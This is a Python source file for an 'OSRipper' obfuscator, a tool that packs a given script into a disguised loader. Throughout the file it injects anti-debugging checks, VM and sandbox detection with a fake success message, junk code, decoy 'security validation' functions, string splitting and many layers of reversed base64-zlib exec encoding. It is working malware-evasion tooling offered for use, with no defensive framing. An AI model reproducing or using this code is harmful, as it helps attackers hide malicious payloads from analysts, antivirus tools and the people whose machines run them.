#!/usr/bin/env python3
"""
Enhanced OSRipper Obfuscator v2.0
Advanced multi-layer obfuscation with modern evasion techniques
"""

import os
import sys
import zlib
import time
import base64
import marshal
import random
import secrets
import string
import ast
import hashlib
from typing import List, Dict, Any

class AdvancedObfuscator:
    """Advanced multi-layer obfuscation engine."""
    
    def __init__(self):
        self.layers = random.randint(3, 7)
        self.variable_names = self._generate_variable_pool()
        self.function_names = self._generate_function_pool()
        self.string_fragments = self._generate_string_fragments()
        
    def _generate_variable_pool(self) -> List[str]:
        """Generate pool of random variable names."""
        pool = []
        # Technical sounding names
        tech_words = ['data', 'buffer', 'stream', 'payload', 'packet', 'frame', 'chunk', 'block']
        prefixes = ['sys', 'net', 'io', 'mem', 'cpu', 'gpu', 'tmp', 'cfg']
        suffixes = ['_ptr', '_buf', '_ctx', '_obj', '_ref', '_val', '_idx', '_len']
        
        for _ in range(50):
            # Mix of technical and random names
            if random.choice([True, False]):
                name = random.choice(prefixes) + '_' + random.choice(tech_words) + random.choice(suffixes)
            else:
                name = ''.join(secrets.choice(string.ascii_letters) for _ in range(random.randint(8, 16)))
            pool.append(name)
        
        return pool
    
    def _generate_function_pool(self) -> List[str]:
        """Generate pool of function names."""
        return [
            'init_context', 'load_buffer', 'decode_stream', 'process_data',
            'validate_checksum', 'decrypt_payload', 'decompress_block',
            'parse_header', 'extract_metadata', 'verify_signature'
        ] + [
            ''.join(secrets.choice(string.ascii_letters) for _ in range(random.randint(6, 12)))
            for _ in range(20)
        ]
    
    def _generate_string_fragments(self) -> List[str]:
        """Generate string fragments for splitting."""
        return [
            'import', 'exec', 'eval', 'compile', 'marshal', 'zlib', 'base64',
            '__import__', 'decompress', 'decode', 'loads', 'dumps'
        ]
    
    def add_fake_imports(self, code: str) -> str:
        """Add fake imports to confuse analysis."""
        fake_imports = [
            'import hashlib as crypto_engine',
            'import json as data_parser', 
            'import urllib.request as net_client',
            'import threading as concurrent_handler',
            'import sqlite3 as db_connector',
            'from datetime import datetime as time_provider',
            'from collections import defaultdict as data_structure'
        ]
        
        selected_imports = random.sample(fake_imports, random.randint(2, 4))
        fake_code = '\n'.join(selected_imports) + '\n\n'
        
        # Add fake variables that are never used
        for i in range(random.randint(3, 6)):
            var_name = random.choice(self.variable_names)
            fake_value = random.choice([
                'None', '[]', '{}', '""', '0', 'False',
                f'"{secrets.token_hex(16)}"',
                f'{random.randint(1000, 9999)}'
            ])
            fake_code += f'{var_name} = {fake_value}\n'
        
        return fake_code + '\n' + code
    
    def add_anti_debug(self, code: str) -> str:
        """Add anti-debugging techniques."""
        anti_debug = f'''
# Anti-debugging checks
import sys
import os
import time

def {random.choice(self.function_names)}():
    # Check for debugging environment
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        os._exit(1)
    
    # Timing check
    start = time.time()
    time.sleep(0.01)
    if time.time() - start > 0.1:
        os._exit(1)
    
    # Check for common debugging tools
    debug_processes = ['gdb', 'lldb', 'strace', 'ltrace', 'ida', 'ollydbg']
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and any(d in proc.info['name'].lower() for d in debug_processes):
                os._exit(1)
    except:
        pass

{random.choice(self.function_names)}()
'''
        return anti_debug + code
    
    def add_vm_detection(self, code: str) -> str:
        """Add VM detection techniques."""
        vm_detect = f'''
# VM Detection
def {random.choice(self.function_names)}():
    import platform
    import os
    
    # Check system info for VM indicators
    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v', 'parallels']
    system_info = platform.platform().lower()
    
    if any(indicator in system_info for indicator in vm_indicators):
        # Fake execution path
        print("System initialized successfully")
        os._exit(0)
    
    # Check MAC address for VM patterns
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        vm_macs = ['00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '00:03:ff']
        if any(vm_mac in mac for vm_mac in vm_macs):
            os._exit(0)
    except:
        pass

{random.choice(self.function_names)}()
'''
        return vm_detect + code
    
    def obfuscate_strings(self, code: str) -> str:
        """Obfuscate string literals."""
        # Find string literals and replace them
        import re
        
        def replace_string(match):
            original = match.group(0)
            content = match.group(1)
            
            if len(content) < 3:  # Skip very short strings
                return original
            
            # Split string into fragments
            fragments = []
            chunk_size = random.randint(2, 4)
            for i in range(0, len(content), chunk_size):
                fragments.append(content[i:i+chunk_size])
            
            # Create obfuscated reconstruction
            var_name = random.choice(self.variable_names)
            reconstruction = ' + '.join([f'"{frag}"' for frag in fragments])
            return f'({reconstruction})'
        
        # Replace double-quoted strings
        code = re.sub(r'"([^"]*)"', replace_string, code)
        
        return code
    
    def add_junk_code(self, code: str) -> str:
        """Add junk code that doesn't affect execution."""
        junk_blocks = []
        
        for _ in range(random.randint(3, 6)):
            block_type = random.choice(['math', 'string', 'list', 'dict'])
            
            if block_type == 'math':
                var1 = random.choice(self.variable_names)
                var2 = random.choice(self.variable_names)
                junk_blocks.append(f'''
{var1} = {random.randint(1, 100)}
{var2} = {random.randint(1, 100)}
{random.choice(self.variable_names)} = {var1} * {var2} + {random.randint(1, 50)}
''')
            elif block_type == 'string':
                var_name = random.choice(self.variable_names)
                junk_string = secrets.token_hex(random.randint(10, 30))
                junk_blocks.append(f'''
{var_name} = "{junk_string}"
{random.choice(self.variable_names)} = len({var_name}) + {random.randint(1, 10)}
''')
            elif block_type == 'list':
                var_name = random.choice(self.variable_names)
                list_items = [str(random.randint(1, 100)) for _ in range(random.randint(3, 8))]
                junk_blocks.append(f'''
{var_name} = [{', '.join(list_items)}]
{random.choice(self.variable_names)} = sum({var_name})
''')
        
        junk_code = '\n'.join(junk_blocks)
        return junk_code + '\n' + code
    
    def create_decoy_functions(self) -> str:
        """Create decoy functions that look important but do nothing."""
        decoy_functions = []
        
        for _ in range(random.randint(2, 4)):
            func_name = random.choice(self.function_names)
            params = [random.choice(self.variable_names) for _ in range(random.randint(1, 3))]
            
            decoy_func = f'''
def {func_name}({', '.join(params)}):
    """Security validation function."""
    {random.choice(self.variable_names)} = hashlib.md5(str({params[0]}).encode()).hexdigest()
    {random.choice(self.variable_names)} = len({random.choice(self.variable_names)}) * {random.randint(2, 10)}
    return {random.choice(['True', 'False', 'None', '0', '1'])}
'''
            decoy_functions.append(decoy_func)
        
        return '\n'.join(decoy_functions)
    
    def encode_with_multiple_layers(self, data: str, layers: int = 3) -> str:
        """Apply multiple encoding layers."""
        encoded = data
        
        # Layer 1: Base64 + Zlib
        for _ in range(layers):
            compressed = zlib.compress(encoded.encode('utf-8'))
            encoded_b64 = base64.b64encode(compressed).decode('utf-8')
            
            # Reverse the string for additional obfuscation
            encoded_b64 = encoded_b64[::-1]
            
            # Create decoder
            decoder_var = random.choice(self.variable_names)
            encoded = f"""
{decoder_var} = lambda x: __import__('zlib').decompress(__import__('base64').b64decode(x[::-1])).decode('utf-8')
exec({decoder_var}('{encoded_b64}'))
"""
        
        return encoded
    
    def create_dynamic_loader(self, encoded_payload: str) -> str:
        """Create a dynamic loader with multiple evasion techniques."""
        loader_template = f'''#!/usr/bin/env python3
# System initialization module
import sys
import os
import time
import hashlib
import random

{self.create_decoy_functions()}

class {random.choice(self.function_names).title()}Handler:
    def __init__(self):
        self.{random.choice(self.variable_names)} = {random.randint(1000, 9999)}
        self.{random.choice(self.variable_names)} = "{secrets.token_hex(16)}"
        
    def {random.choice(self.function_names)}(self):
        # Environment validation
        if not self._validate_environment():
            return False
        
        # Load and execute payload
        self._execute_payload()
        
    def _validate_environment(self):
        # Timing check
        start = time.time()
        for i in range(1000):
            hashlib.md5(str(i).encode()).hexdigest()
        
        if time.time() - start < 0.01:  # Too fast = likely sandbox
            return False
        
        return True
    
    def _execute_payload(self):
        {encoded_payload}

# Initialize handler
{random.choice(self.variable_names)} = {random.choice(self.function_names).title()}Handler()
{random.choice(self.variable_names)}.{random.choice(self.function_names)}()
'''
        return loader_template
    
    def obfuscate_file(self, input_file: str, output_file: str) -> bool:
        """Main obfuscation function."""
        try:
            with open(input_file, 'r') as f:
                original_code = f.read()
            
            print(f"🔧 Starting advanced obfuscation with {self.layers} layers...")
            
            # Step 1: Add anti-debugging
            code = self.add_anti_debug(original_code)
            print("✅ Anti-debugging techniques added")
            
            # Step 2: Add VM detection
            code = self.add_vm_detection(code)
            print("✅ VM detection added")
            
            # Step 3: Add fake imports and junk code
            code = self.add_fake_imports(code)
            code = self.add_junk_code(code)
            print("✅ Junk code and fake imports added")
            
            # Step 4: Obfuscate strings
            code = self.obfuscate_strings(code)
            print("✅ String obfuscation applied")
            
            # Step 5: Multi-layer encoding
            encoded_payload = self.encode_with_multiple_layers(code, self.layers)
            print(f"✅ {self.layers}-layer encoding applied")
            
            # Step 6: Create dynamic loader
            final_code = self.create_dynamic_loader(encoded_payload)
            print("✅ Dynamic loader created")
            
            # Write output
            with open(output_file, 'w') as f:
                f.write(final_code)
            
            # Calculate file size
            file_size = os.path.getsize(output_file)
            size_kb = file_size / 1024
            print(f"✅ Obfuscated file saved: {output_file} ({size_kb:.1f} KB)")
            
            return True
            
        except Exception as e:
            print(f"❌ Obfuscation failed: {e}")
            return False

def MainMenu(file):
    """Main obfuscation entry point (backward compatibility)."""
    obfuscator = AdvancedObfuscator()
    output = file.lower().replace('.py', '') + '_or.py'
    
    success = obfuscator.obfuscate_file(file, output)
    if not success:
        # Fallback to original method
        print("🔄 Falling back to basic obfuscation...")
        try:
            with open(file, 'r') as f:
                data = f.read()
            
            # Basic encoding
            layers = random.randint(50, 70)
            for _ in range(layers):
                compressed = zlib.compress(data.encode('utf-8'))
                encoded = base64.b64encode(compressed)[::-1]
                data = f"exec(__import__('zlib').decompress(__import__('base64').b64decode({repr(encoded)}[::-1])))"
            
            with open(output, 'w') as f:
                f.write(data)
            
            print(f"✅ Basic obfuscation completed: {output}")
            
        except Exception as e:
            print(f"❌ All obfuscation methods failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python obfuscator_enhanced.py <file.py>")
        sys.exit(1)
    
    MainMenu(sys.argv[1])
